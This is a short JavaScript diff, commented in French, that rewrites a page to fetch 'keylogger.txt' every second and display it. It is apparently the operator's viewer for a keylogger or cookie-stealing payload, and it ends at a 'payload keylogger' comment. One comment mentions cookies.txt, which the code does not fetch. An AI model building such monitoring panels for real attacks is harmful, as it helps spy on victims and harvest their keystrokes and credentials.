@@ -1,9 +1,20 @@
-function refresh()
-{
- parent.log.location.href="keylogger.txt";
- setTimeout("refresh()",1000);
+function chargerFichier() {
+    fetch("keylogger.txt")  // On récupère directement cookies.txt
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById("contenu-keylogger").textContent = data;
+        })
+        .catch(error => {
+            document.getElementById("contenu-keylogger").textContent = "Erreur lors du chargement.";
+            console.error("Erreur :", error);
+        });
 }
-refresh();
+    
+// Charger le fichier immédiatement au démarrage
+chargerFichier();
+    
+// Actualiser toutes les 1 secondes
+setInterval(chargerFichier, 1000);
 
 
 // payload keylogger
